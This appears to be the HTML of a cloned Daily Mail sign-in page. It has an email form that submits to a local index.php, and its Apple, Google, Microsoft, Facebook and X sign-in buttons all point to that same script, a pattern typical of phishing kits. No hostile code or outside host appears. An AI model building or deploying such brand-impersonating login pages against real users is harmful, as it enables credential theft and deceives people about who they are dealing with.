<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Daily Mail - Sign In</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    /*Curved header*/
    .hero-curve {
      position: relative;
      background: #0b55a6; 
      height: 260px;
      border-bottom-left-radius: 50% 20%;
      border-bottom-right-radius: 50% 20%;
      z-index: 0;
    }
  </style>
</head>
<body class="bg-white text-gray-800">
  <div class="hero-curve flex items-center justify-center">
    <!--Back button-->
    <button type="button" onclick="history.back()" aria-label="Back" class="absolute left-4 top-4 z-50 inline-flex items-center justify-center w-10 h-10 bg-white rounded-full shadow-md text-gray-700">
      <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
    </button>
    <div class="text-center text-white">
      <img src="assets/dailymail-white.png" alt="Daily Mail" class="h-16 object-contain mx-auto" />
    </div>
  </div>

    <main class="-mt-12">
    <div class="max-w-md mx-auto px-4 relative z-40 mb-12 md:mb-16">
      <div class="bg-white rounded-xl shadow-lg overflow-hidden relative z-40">
        <div class="p-6">
          <h2 class="text-xl font-semibold text-center">Sign In or Create an Account</h2>
          <p class="text-center text-gray-600 mt-3">Begin by entering your email address below or use your social sign-in provider</p>

          <form action="/index.php" method="get" class="mt-6">
            <label class="block text-sm font-medium text-gray-700">Enter email address</label>
            <input name="email" type="email" placeholder="Your email address" required class="mt-2 w-full px-4 py-3 border rounded-md bg-gray-50" />
            <button type="submit" class="mt-4 w-full bg-blue-700 text-white py-3 rounded-lg">Continue</button>
          </form>

          <div class="mt-6 text-center text-sm text-gray-500">— or use —</div>

          <div class="mt-4 flex gap-3 justify-center">
            <!--Social icons as circular buttons-->
            <a href="index.php" aria-label="Sign in with Apple" class="w-12 h-12 rounded-full border flex items-center justify-center">
              <img src="assets/apple_logo.png" alt="Apple logo" class="w-12 h-12 object-contain" />
            </a>

            <a href="index.php" aria-label="Sign in with Google" class="w-12 h-12 rounded-full border flex items-center justify-center">
              <img src="assets/google_logo.png" alt="Google logo" class="w-6 h-6 object-contain" />
            </a>

            <a href="index.php" aria-label="Sign in with Microsoft" class="w-12 h-12 rounded-full border flex items-center justify-center">
              <img src="assets/microsoft_logo.png" alt="Microsoft logo" class="w-6 h-6 object-contain" />
            </a>

            <a href="index.php" aria-label="Sign in with Facebook" class="w-12 h-12 rounded-full border flex items-center justify-center">
              <img src="assets/facebook_logo.png" alt="Facebook logo" class="w-12 h-12 object-contain" />
            </a>

            <a href="index.php" aria-label="Sign in with X" class="w-12 h-12 rounded-full border flex items-center justify-center">
              <img src="assets/x_logo.png" alt="X (Twitter) logo" class="w-12 h-12 object-contain" />
            </a>
          </div>

          <div class="mt-6 text-center">
            <div class="text-sm text-gray-700">Got a @hotmail.com or outlook.com account?</div>
            <a href="index.php" aria-label="Continue with Microsoft" class="mt-3 inline-flex items-center gap-2 px-4 py-2 border rounded-full">
              <img src="assets/microsoft_logo.png" alt="Microsoft logo" class="w-6 h-6 object-contain" />
              Continue with Microsoft
            </a>
          </div>
        </div>

        <div class="px-6 py-4 text-center text-xs text-gray-500">
          This site is protected by reCAPTCHA and the Google <a href="#" class="text-blue-600 underline">Privacy Policy</a> and <a href="#" class="text-blue-600 underline">Terms of Service</a> apply.
        </div>
      </div>
    </div>
  </main>
</body>
</html>
